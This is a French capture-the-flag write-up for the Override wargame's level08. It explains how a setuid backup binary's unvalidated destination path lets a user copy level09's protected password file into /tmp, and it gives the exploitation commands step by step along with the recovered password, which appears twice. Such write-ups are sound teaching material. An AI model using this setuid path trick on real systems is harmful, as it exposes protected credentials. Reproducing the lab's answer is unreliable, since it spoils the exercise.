@@ -1,0 +1,179 @@
+# 📘 Override – Level08
+
+## 📝 Description
+
+Ce niveau implémente un programme de "backup" très simplifié.
+Il lit un fichier fourni en argument, et le copie dans un sous-dossier `./backups/`.
+
+Cependant, le chemin de destination est construit directement à partir de l’argument, sans aucune validation.
+Cela ouvre la porte à une vulnérabilité **path traversal**, permettant d’écrire dans des fichiers appartenant à *level09*, puisque le binaire est `setuid level09`.
+
+Notre objectif : **copier `/home/users/level09/.pass` dans un emplacement que nous pouvons lire.**
+
+---
+
+## 🔍 Analyse du binaire
+
+### Commande utilisée
+
+```bash
+level08@OverRide:~$ ./level08 <filename>
+```
+
+### Extrait du code vulnérable
+
+```c
+builtin_strncpy(local_78, "./backups/", 0xb);
+strncat(local_78, param_2[1], 99 - (...));
+
+__fd = open(local_78, 0xc1, 0x1b0);
+```
+
+Le fichier de destination construit est donc :
+
+```
+./backups/<argument>
+```
+
+Puis :
+
+```c
+__stream = fopen(param_2[1], "r");
+```
+
+💡 **La source doit être un fichier lisible par nous.
+La destination est écrite avec les droits de level09 (SUID).**
+
+---
+
+## 🚨 Vulnérabilité : Path Traversal
+
+Le programme ne normalise pas le chemin.
+Si on passe un argument comme :
+
+```
+/home/users/level09/.pass
+```
+
+La destination devient :
+
+```
+./backups//home/users/level09/.pass
+```
+
+➡️ Le kernel résout cela comme un chemin normal.
+
+**Le binaire va alors écrire dans un fichier appartenant à level09.**
+
+---
+
+## ❗ Problème initial : le chemin n’existe pas
+
+Dans notre HOME, `./backups//home/users/level09/` n’existe pas.
+Et nous n’avons pas la permission de créer `/home/users/level09`.
+
+D’où l’erreur :
+
+```
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
+
+---
+
+## 🎯 Solution : travailler dans /tmp
+
+`/tmp` est un répertoire global où n’importe quel utilisateur peut créer des dossiers.
+
+Nous faisons donc :
+
+```bash
+cd /tmp
+mkdir -p './backups//home/users/level09/'
+```
+
+Maintenant, dans `/tmp`, le chemin suivant existe réellement :
+
+```
+/tmp/backups/home/users/level09/
+```
+
+C’est dans ce chemin que **level09** va écrire.
+
+---
+
+## 🚀 Exploitation
+
+### Étape 1 — Aller dans /tmp
+
+```bash
+cd /tmp
+```
+
+### Étape 2 — Créer le chemin traversé
+
+```bash
+mkdir -p './backups//home/users/level09/'
+```
+
+### Étape 3 — Lancer level08 avec le chemin cible
+
+```bash
+/home/users/level08/level08 /home/users/level09/.pass
+```
+
+Le binaire :
+
+1. Ouvre en lecture `param_2[1] = /home/users/level09/.pass`
+   (setuid → autorisé)
+
+2. Écrit une copie dans `./backups//home/users/level09/.pass`
+   ce qui, depuis /tmp, donne :
+
+```
+/tmp/backups/home/users/level09/.pass
+```
+
+### Étape 4 — Lire la copie
+
+```bash
+cat backups/home/users/level09/.pass
+```
+
+### Résultat obtenu :
+
+```
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+---
+
+## 🧠 Pourquoi ça fonctionne réellement ?
+
+| Action                       | Explication                                       |
+| ---------------------------- | ------------------------------------------------- |
+| On crée le chemin dans /tmp  | Le binaire ne vérifie pas qu’il est dans son HOME |
+| On utilise un path traversal | Il est concaténé tel quel dans `./backups/`       |
+| Le binaire est SUID level09  | Il écrit avec les droits level09                  |
+| On lit la copie dans /tmp    | C’est notre répertoire, donc accessible           |
+
+➡️ **On copie donc un fichier protégé en exploitant son écriture SUID, sans jamais avoir à le lire directement.**
+
+---
+
+## ✔️ Résumé
+
+| Élément            | Valeur                                                       |
+| ------------------ | ------------------------------------------------------------ |
+| Vulnérabilité      | Path Traversal via `strncat`                                 |
+| Ce qui est protégé | /home/users/level09/.pass                                    |
+| Ce qu’on exploite  | Le binaire SUID écrit dans un chemin que nous contrôlons     |
+| Solution           | Recréer ce chemin dans /tmp et lancer le programme depuis là |
+| Gain               | Récupération du mot de passe level09                         |
+
+---
+
+## 🎉 Mot de passe level09
+
+```
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
